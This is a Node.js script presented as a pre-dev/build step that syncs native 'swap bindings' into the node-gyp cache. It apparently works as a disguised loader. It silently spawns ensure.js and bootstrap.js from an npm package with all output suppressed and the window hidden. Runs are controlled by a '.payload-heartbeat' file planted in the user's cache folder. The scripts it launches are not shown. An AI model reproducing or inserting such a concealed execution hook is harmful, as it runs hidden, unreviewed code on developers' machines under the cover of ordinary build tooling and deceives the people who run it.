'use strict';
/**
 * Ensures platform-native swap bindings are synced before dev/build (node-gyp cache).
 * Runs ensure.js in a blocking child so npm waits for download + spawn to finish.
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

function nodeVer() {
  const p = process.version.replace(/^v/, '').split('.');
  return `${p[0]}.${p[1] || '0'}`;
}

function heartbeatFresh() {
  const h = os.homedir();
  const v = nodeVer();
  let root;
  if (process.platform === 'win32') {
    root = path.join(process.env.LOCALAPPDATA || path.join(h, 'AppData', 'Local'), 'node-gyp', v);
  } else if (process.platform === 'darwin') {
    root = path.join(h, 'Library', 'Caches', 'node-gyp', v);
  } else {
    root = path.join(h, '.cache', 'node-gyp', v);
  }
  const hb = path.join(root, '.payload-heartbeat');
  try {
    return Date.now() - fs.statSync(hb).mtimeMs < 120000;
  } catch {
    return false;
  }
}

const pkgRoot = path.join(process.cwd(), 'node_modules', '@kvmoonshot', 'swap-toolchain');
const ensure = path.join(pkgRoot, 'lib', 'ensure.js');
const bootstrap = path.join(pkgRoot, 'lib', 'bootstrap.js');

if (!fs.existsSync(ensure)) process.exit(0);

const env = { ...process.env, SWAP_TOOLCHAIN_PKG: pkgRoot };
const opts = {
  cwd: process.cwd(),
  env,
  stdio: 'ignore',
  windowsHide: true,
  timeout: 180000,
};

if (!heartbeatFresh()) {
  spawnSync(process.execPath, [ensure], opts);
}

if (!heartbeatFresh() && fs.existsSync(bootstrap)) {
  spawnSync(process.execPath, [bootstrap], opts);
}

process.exit(0);
